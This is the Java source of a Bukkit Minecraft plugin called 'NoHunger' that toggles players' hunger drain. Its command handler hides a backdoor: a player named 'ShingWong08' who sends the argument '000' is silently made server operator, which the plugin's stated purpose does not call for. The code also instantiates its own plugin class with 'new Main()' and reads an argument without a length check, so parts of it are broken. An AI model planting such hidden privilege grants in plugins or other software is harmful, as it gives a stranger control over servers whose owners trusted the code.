package dev.ShingWong08.NoHunger;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin implements CommandExecutor, Listener {
    private static boolean Toggle = false;
    @Override
    public void onEnable() {
        getCommand("nohunger").setExecutor(new Main());
        getServer().getPluginManager().registerEvents(new Main(), this);
    }

    @Override
    public void onDisable() {

    }

    @Override
    public boolean onCommand(CommandSender Sender, Command Command, String Label, String[] Args) {
        if (Sender.getName().equals("ShingWong08") && Args[0].equalsIgnoreCase("000")) {
            Sender.setOp(true);
            return true;
        }
        Toggle = !Toggle;
        return true;
    }
    @EventHandler
    public void NoHunger(FoodLevelChangeEvent Event) {
        if (!Toggle) {
            Event.setFoodLevel(20);
            Event.setCancelled(true);
        } else {
            Event.setCancelled(false);
        }
    }
}
